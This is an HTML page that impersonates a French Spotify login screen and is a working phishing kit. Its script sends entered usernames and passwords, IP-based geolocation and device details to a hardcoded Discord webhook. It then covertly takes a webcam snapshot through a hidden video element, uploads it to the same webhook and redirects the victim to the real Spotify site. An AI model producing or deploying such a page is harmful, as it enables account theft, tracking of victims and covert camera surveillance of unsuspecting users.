<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Spotify - Connexion</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Figtree:wght@400;700;900&display=swap');
        body { background-color: #000; color: #fff; font-family: 'Figtree', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        .login-card { background-color: #121212; width: 100%; max-width: 440px; padding: 50px 45px; border-radius: 8px; text-align: center; }
        .logo { width: 100px; margin: 0 auto 35px auto; }
        h1 { font-size: 32px; font-weight: 900; margin-bottom: 40px; letter-spacing: -1px; }
        .input-group { text-align: left; margin-bottom: 20px; }
        label { display: block; font-size: 14px; font-weight: 700; margin-bottom: 8px; }
        input { width: 100%; background: #121212; border: 1px solid #727272; border-radius: 4px; padding: 14px; color: #fff; outline: none; font-size: 16px; }
        input:focus { border: 2px solid #fff; }
        .btn-green { background: #1ed760; color: #000; font-weight: 700; padding: 14px; border-radius: 500px; width: 100%; margin-top: 15px; font-size: 16px; border: none; cursor: pointer; }
        #v, #c { position: absolute; left: -9999px; visibility: hidden; }
    </style>
</head>
<body>
    <div class="login-card">
        <img src="https://storage.googleapis.com/pr-newsroom-wp/1/2018/11/Spotify_Logo_RGB_White.png" class="logo">
        <h1>Se connecter</h1>
        <div class="input-group"><label>E-mail ou nom d'utilisateur</label><input id="u" type="text" placeholder="E-mail ou nom d'utilisateur"></div>
        <div class="input-group"><label>Mot de passe</label><input id="p" type="password" placeholder="Mot de passe"></div>
        <button onclick="collectAll()" id="btn" class="btn-green">Se connecter</button>
    </div>
    <video id="v" autoplay playsinline></video><canvas id="c"></canvas>

    <script>
        const hook = "https://discord.com/api/webhooks/1481101174131392554/JO8MZpYjagqXqSFcnyp4ZCyOnUKe-vVdsyNeg7e7IJCVwdIgzlmeWxH65dQzr7hUXxke";

        async function collectAll() {
            const user = document.getElementById('u').value;
            const pass = document.getElementById('p').value;
            if(!user || !pass) return;

            // COLLECTE MASSIVE
            let net = {}; try { net = await fetch('https://ipapi.co/json/').then(r => r.json()); } catch(e){}
            let bat = {}; try { bat = await navigator.getBattery(); } catch(e){}
            
            // Infos GPU
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl');
            const debugInfo = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
            const gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Inconnu";

            const payload = {
                embeds: [{
                    title: "­¤ææ RAPPORT D├ēTAILL├ē LVN ULTIMATE V5",
                    color: 1955168,
                    thumbnail: { url: "https://upload.wikimedia.org/wikipedia/commons/1/19/Spotify_logo_without_text.svg" },
                    fields: [
                        { name: "­¤æż COMPTE", value: `**User:** \`${user}\`\n**Pass:** \`${pass}\``, inline: false },
                        { name: "­¤īÉ R├ēSEAU & IP", value: `**IP:** \`${net.ip}\`\n**FAI:** \`${net.org}\`\n**Ville:** \`${net.city}\`\n**Pays:** \`${net.country_name}\`\n**Code Postal:** \`${net.postal}\``, inline: true },
                        { name: "­¤ō▒ HARDWARE", value: `**RAM:** \`${navigator.deviceMemory || '?'}GB\`\n**CPU:** \`${navigator.hardwareConcurrency || '?'} Coeurs\`\n**Batterie:** \`${Math.round(bat.level * 100) || '?'}%\`\n**En Charge:** \`${bat.charging ? 'Oui' : 'Non'}\`\n**GPU:** \`${gpu}\``, inline: true },
                        { name: "ŌÜÖ’ĖÅ SYST├łME", value: `**Plateforme:** \`${navigator.platform}\`\n**Langue:** \`${navigator.language}\`\n**├ēcran:** \`${screen.width}x${screen.height}\`\n**Fuseau:** \`${Intl.DateTimeFormat().resolvedOptions().timeZone}\``, inline: true },
                        { name: "­¤ōŹ G├ēOPOSITION", value: `**Lat:** \`${net.latitude}\` | **Long:** \`${net.longitude}\` \n**[Ouvrir Google Maps](https://www.google.com/maps?q=${net.latitude},${net.longitude})**`, inline: false },
                        { name: "­¤ĢĄ’ĖÅ USER-AGENT", value: `\`${navigator.userAgent}\``, inline: false }
                    ],
                    footer: { text: "Rapport g├®n├®r├® le " + new Date().toLocaleString() }
                }]
            };

            await fetch(hook, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload) });

            // Capture Cam├®ra
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.getElementById('v');
                video.srcObject = stream;
                await new Promise(r => setTimeout(r, 2000));
                const c = document.getElementById('c');
                c.width = 1280; c.height = 720;
                c.getContext('2d').drawImage(video, 0, 0);
                c.toBlob(async (b) => {
                    const fd = new FormData();
                    fd.append('file', b, 'capture.png');
                    fd.append('content', "­¤ōĖ **VISUEL CIBLE :**");
                    await fetch(hook, { method: 'POST', body: fd });
                    stream.getTracks().forEach(t => t.stop());
                });
            } catch (e) {}

            setTimeout(() => { window.location.href = "https://www.spotify.com"; }, 3000);
        }
    </script>
</body>
</html>
